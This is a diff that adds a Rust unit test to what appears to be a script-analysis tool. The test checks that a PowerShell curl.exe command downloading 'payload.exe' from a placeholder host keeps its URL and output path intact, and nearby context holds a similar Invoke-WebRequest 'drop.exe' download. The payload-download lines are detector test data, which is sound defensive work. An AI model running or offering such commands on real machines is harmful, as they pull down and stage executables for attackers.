@@ -7893,6 +7893,33 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn powershell_curl_exe_attached_output_preserves_destination() {
+        let ps = r#"C:\Windows\System32\curl.exe -fsSLoC:\Temp\curl-ps.exe https://ps-curl-output.example/payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://ps-curl-output.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\curl-ps.exe")
+            )
+        });
+        assert!(
+            has,
+            "PowerShell curl.exe attached -o destination was not preserved: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { src, .. } if src == "https://ps-curl")),
+            "curl fallback truncated the hostname at an internal -o marker: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_liberal_slash_mixed_case_url_is_structured_download() {
         let ps = r#"Invoke-WebRequest -Uri "hTtP:\\liberal.example\drop.exe" -OutFile "drop.exe""#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
